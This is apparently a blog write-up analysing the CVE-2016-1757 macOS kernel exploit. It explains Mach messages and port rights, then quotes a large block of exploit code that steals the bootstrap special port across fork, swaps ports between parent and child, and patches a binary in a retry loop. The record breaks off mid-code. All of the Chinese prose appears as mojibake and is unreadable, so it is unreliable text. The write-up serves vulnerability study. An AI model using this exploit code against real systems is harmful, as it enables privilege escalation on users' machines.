<h1 id="0x01_Mach">0x01 Mach</h1><p><code>Mach</code>åœ¨<code>OS X</code>çš„å†…æ ¸ä¸­å¤„äºæœ€æ¥è¿‘åº•å±‚çš„ä¸€ä¸ªæ¨¡å—ã€‚æ˜¯<code>XNU</code>å†…æ ¸çš„å†…æ ¸ã€‚æ˜¯ä¸€ä¸ª<code>BSD</code>å±‚åŒ…è£¹çš„<code>å¾®å†…æ ¸</code>ã€‚è€Œå†…æ ¸ä¸­çš„<code>task</code>,<code>thread</code>,<code>virtual memory</code>ç­‰æ¨¡å—ï¼Œå¯¹äº<code>Mach</code>æ¥è¯´ï¼Œéƒ½æ˜¯ä¸€ä¸ª<code>Object</code>ã€‚è¿™äº›<code>Objects</code>åŸºäº<code>Mach</code>å®ç°è‡ªå·±çš„åŠŸèƒ½ï¼Œå¹¶ä¸”é€šè¿‡<code>Mach Message</code>æ¥è¿›è¡Œç›¸äº’ä¹‹é—´çš„é€šä¿¡ã€‚</p>
<blockquote>
<p>The Mach kernel thus becomes a low-level foundation, concerning itself with only the bare mini-mum required for driving the operating system. Everything else may be implemented by some higher    layer of an operating system, which then draws on the Mach primitives and manipulate them inwhatever way it sees fit.                                        </p>
<p>â€‹                                                                                                           â€”â€”â€“Mac OSÂ® X and iOS Internals    </p>
</blockquote>
<h2 id="1-1_Mach_Messages">1.1 Mach Messages</h2><p><code>Mach Messages</code>æ€»å…±æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯<code>Simple Messages</code>å’Œ<code>Complex Messages</code>ã€‚</p>
<h3 id="1-1-1_Simple_Message">1.1.1 Simple Message</h3><p><code>Simple Message</code>çš„ç»“æ„ä½“ï¼Œå¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/simple_message.png?1" alt="simple message"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">natural_t</span>			pad1;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>		pad2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>			pad3 : <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</span><br><span class="line">&#125; <span class="keyword">mach_msg_type_descriptor_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="keyword">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">struct</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_bits_t</span>	msgh_bits;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>	msgh_size;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_remote_port;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_local_port;</span><br><span class="line">  <span class="keyword">mach_port_name_t</span>	msgh_voucher_port;</span><br><span class="line">  <span class="keyword">mach_msg_id_t</span>		msgh_id;</span><br><span class="line">&#125; <span class="keyword">mach_msg_header_t</span>;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä½¿ç”¨<code>mach message</code>æ—¶,å¯ä»¥è‡ªå·±å®šä¹‰ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œæ›´æ–¹ä¾¿çš„ç¼–å†™ä»£ç ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">    <span class="keyword">mach_msg_type_descriptor_t</span> type;</span><br><span class="line">&#125; message;</span><br><span class="line"></span><br><span class="line">message.header = (<span class="keyword">mach_msg_header_t</span>) &#123;</span><br><span class="line">    .msgh_remote_port = port,</span><br><span class="line">    .msgh_local_port = MACH_PORT_NULL,</span><br><span class="line">    .msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>),</span><br><span class="line">    .msgh_size = <span class="keyword">sizeof</span>(message)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.body = (<span class="keyword">mach_msg_body_t</span>) &#123;</span><br><span class="line">    .msgh_descriptor_count = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.type = (<span class="keyword">mach_msg_type_descriptor_t</span>) &#123;</span><br><span class="line">    .pad1 = data,</span><br><span class="line">    .pad2 = <span class="keyword">sizeof</span>(data)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>æ„å»ºä¸€ä¸ª<code>message</code>ï¼Œç„¶åè°ƒç”¨<code>mach API</code>å‘é€è¿™ä¸ªæ¶ˆæ¯ã€‚å½“ç„¶<code>msgh_descriptor_count</code>ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–å€¼ï¼Œé‚£ä¹ˆå°±è¦æœ‰ç›¸å¯¹äºä¸ªæ•°çš„<code>mach_msg_type_descriptor_t</code>ã€‚</p>
<h3 id="1-1-2_Complex_Messages">1.1.2 Complex Messages</h3><p><code>Complex Messages</code>å’Œ<code>Simple Message</code>å¯¹æ¯”ï¼Œå¤šäº†ä¸€ä¸ªé™„åŠ çš„æ•°æ®<code>Mach Trailers</code>ã€‚å¹¶ä¸”æ•°æ®æè¿°ç¬¦çš„å®šä¹‰ä¹Ÿä¸åŒäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/complex_message.png?1" alt="complex message"></p>
<p>æè¿°ç¬¦çš„å®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span>*				address;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> !defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     		pad1: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>    type: <span class="number">8</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">mach_msg_ool_descriptor_t</span>;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_ports">1.2 ports</h2><h3 id="1-2-1_port_çš„æƒé™">1.2.1 port çš„æƒé™</h3><p>æ¯ä¸€æ¡<code>Mach Message</code>éƒ½æ˜¯ä»ä¸€ä¸ª<code>port</code>å‘é€åˆ°å¦å¤–ä¸€ä¸ª<code>port</code>ï¼Œè€Œæ¯ä¸€ä¸ª<code>port</code>éƒ½æœ‰è‡ªå·±çš„æƒé™ã€‚</p>
<ul>
<li>SENDï¼šå°†<code>Mach Message</code>æ·»åŠ åˆ°<code>port</code>çš„é˜Ÿåˆ—ä¸­ã€‚</li>
<li>RECIVEï¼šå…è®¸ä»é˜Ÿåˆ—ä¸­è¯»å–<code>Mach Message</code>ã€‚ä¸€èˆ¬æƒ…å†µä¸‹åªæœ‰<code>port</code>çš„æŒæœ‰è€…æ‹¥æœ‰è¿™ä¸ªæƒåˆ©ã€‚</li>
</ul>
<p><code>port</code>ä»¥åŠä»–çš„<code>æƒé™</code>ï¼Œå¯ä»¥ä»ä¸€ä¸ªè¿›ç¨‹è½¬äº¤ç»™å¦å¤–ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™ä¹Ÿå°±æ˜¯è¿™ä¸€æ¬¡è¦åˆ†æçš„<code>EXP</code>çš„ä¸»è¦åŸç†ã€‚</p>
<h3 id="1-2-2_ä¸€äº›ç‰¹æ®Šçš„port">1.2.2 ä¸€äº›ç‰¹æ®Šçš„port</h3><p>å½“æ¯ä¸€ä¸ª<code>task</code>è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œç³»ç»Ÿéƒ½ä¼šæä¾›ä¸€ç³»åˆ—ç‰¹æ®Šçš„<code>port</code>ï¼Œåœ¨è¿™äº›<code>port</code>å½“ä¸­ï¼Œæˆ‘ä»¬æ¯”è¾ƒæ„Ÿå…´è¶£çš„æ˜¯ä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>host portï¼šä»£è¡¨æ­£åœ¨è¿è¡Œè¯¥<code>task</code>çš„æ•´å°æœºå™¨çš„<code>port</code>ã€‚</li>
<li>task port: æ­£åœ¨è¿è¡Œçš„<code>task</code>æœ¬èº«çš„<code>port</code>ã€‚</li>
<li>bootstrap port : å’Œ<code>bootstrap server</code>è¿æ¥ç€çš„ä¸€ä¸ª<code>port</code>ã€‚</li>
</ul>
<h2 id="1-3_Send&amp;Recv_Messages">1.3 Send&amp;Recv Messages</h2><p><code>Message</code>çš„å‘é€ä¸æ¥æ”¶ï¼Œéƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ª<code>mach API</code>ï¼Œ<code>mach_msg</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_msg(recv_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              msg_options,          <span class="comment">// option indicating receive</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// send size</span></span><br><span class="line">              recv_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              server_port,           <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br><span class="line"></span><br><span class="line">kr = mach_msg(send_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              MACH_SEND_MSG,         <span class="comment">// option indicating send</span></span><br><span class="line">              send_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// receive limit</span></span><br><span class="line">              MACH_PORT_NULL,        <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br></pre></td></tr></table></figure>
<p>æ ¹æ®å‚æ•°çš„ä¸åŒï¼Œå®ç°äº†æ¥æ”¶<code>Message</code>å’Œå‘é€<code>Message</code>ä¸åŒçš„åŠŸèƒ½ã€‚</p>
<p>é€šè¿‡å¯¹æºç çš„é˜…è¯»ï¼Œ<code>mach_msg</code>å®é™…ä¸Šæ˜¯è°ƒç”¨äº†<code>mach_msg_overwrite_trap</code>ï¼Œè¿›å…¥å†…æ ¸ä¸­ï¼Œé€šè¿‡<code>ipc_kmsg_*</code>ç³»åˆ—å‡½æ•°ï¼Œæ¥å®ç°çš„æ¶ˆæ¯å‘é€ä¸æ¥æ”¶ã€‚å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p>
<p><img src="http://blog.ibireme.com/wp-content/uploads/2015/05/RunLoop_5.png" alt=""></p>
<p>å›¾ç‰‡è½¬è‡ª(<a href="http://blog.ibireme.com/2015/05/18/runloop/)ã€‚" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/)ã€‚</a></p>
<h2 id="0x02_The_Port_Swap_Dance">0x02 The Port Swap Dance</h2><p>äº†è§£äº†<code>port</code>å’Œ<code>Mach Message</code>çš„åŸºç¡€çŸ¥è¯†ä¹‹åï¼Œå…ˆæ¥å›é¡¾ä¸€ä¸‹æˆ‘ä»¬å·²ç»<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=226154" target="_blank" rel="external">åˆ†æè¿‡çš„EXPä¸­</a>ï¼Œæœ‰è¿™æ ·ä¸€æ®µä»£ç ã€‚</p>
<h3 id="2-1_æºç ">2.1 æºç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">&#125; <span class="keyword">port_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mach message for receiving a port right</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">port_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">&#125; <span class="keyword">simple_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">simple_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a copy in the parent of the stolen special port such that it can be restored</span></span><br><span class="line"><span class="keyword">mach_port_t</span> saved_special_port = MACH_PORT_NULL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the shared port right in the parent</span></span><br><span class="line"><span class="keyword">mach_port_t</span> shared_port_parent = MACH_PORT_NULL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_shared_port</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line">  <span class="comment">// get a send right to the port we're going to overwrite so that we can both</span></span><br><span class="line">  <span class="comment">// restore it for ourselves and send it to our child</span></span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"saving original special port value"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate the shared port we want our child to have a send right to</span></span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;shared_port_parent);</span><br><span class="line"></span><br><span class="line">  MACH_ERR(<span class="string">"allocating shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// insert the send right</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line">  MACH_ERR(<span class="string">"inserting MAKE_SEND into shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);</span><br><span class="line">  MACH_ERR(<span class="string">"setting special port"</span>, err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_child() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// grab the shared port which our parent stashed somewhere in the special ports</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> shared_port_child = MACH_PORT_NULL;</span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;shared_port_child);</span><br><span class="line">  MACH_ERR(<span class="string">"child getting stashed port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child got stashed port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// say hello to our parent and send a reply port so it can send us back the special port to restore</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate a reply port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line">  MACH_ERR(<span class="string">"child allocating reply port"</span>, err); </span><br><span class="line"></span><br><span class="line">  <span class="comment">// send the reply port in a hello message</span></span><br><span class="line">  <span class="keyword">simple_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = shared_port_child;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"child sending task port message"</span>, err);</span><br><span class="line"> </span><br><span class="line">  LOG(<span class="string">"child sent hello message to parent over shared port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message on the reply port containing the stolen port to restore</span></span><br><span class="line">  <span class="keyword">port_msg_rcv_t</span> stolen_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;stolen_port_msg.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"child receiving stolen port\n"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// extract the port right from the message</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> stolen_port_to_restore = stolen_port_msg.port.name;</span><br><span class="line">  <span class="keyword">if</span> (stolen_port_to_restore == MACH_PORT_NULL) &#123;</span><br><span class="line">    FAIL(<span class="string">"child received invalid stolen port to restore"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for the child</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);</span><br><span class="line">  MACH_ERR(<span class="string">"child restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child restored stolen port"</span>);</span><br><span class="line">  <span class="keyword">return</span> shared_port_child;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_parent() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for ourselves</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"parent restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message from the child on the shared port</span></span><br><span class="line">  <span class="keyword">simple_msg_rcv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 shared_port_parent,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"parent receiving child hello message"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"parent received hello message from child"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// send the special port to our child over the hello message's reply port</span></span><br><span class="line">  <span class="keyword">port_msg_send_t</span> special_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  special_port_msg.header.msgh_size        = <span class="keyword">sizeof</span>(special_port_msg);</span><br><span class="line">  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;</span><br><span class="line">  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), <span class="number">0</span>) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  special_port_msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  special_port_msg.port.name        = saved_special_port;</span><br><span class="line">  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;special_port_msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"parent sending special port back to child"</span>, err);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> shared_port_parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  parse_args(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check that the original is actually a 64-bit mach-o and not a fat binary</span></span><br><span class="line">  verify_original(original, original_length);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// apply the patch to the original</span></span><br><span class="line">  apply_patch(original, original_length, patch, patch_length);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> tries = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    setup_shared_port();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (child_pid == -<span class="number">1</span>) &#123;</span><br><span class="line">      FAIL(<span class="string">"forking"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_child = recover_shared_port_child();</span><br><span class="line">      do_child(shared_port_child);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_parent = recover_shared_port_parent();</span><br><span class="line">      do_parent(shared_port_parent);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> status;</span><br><span class="line">      wait(&amp;status);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">        LOG(<span class="string">"worked :-)"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      tries++;</span><br><span 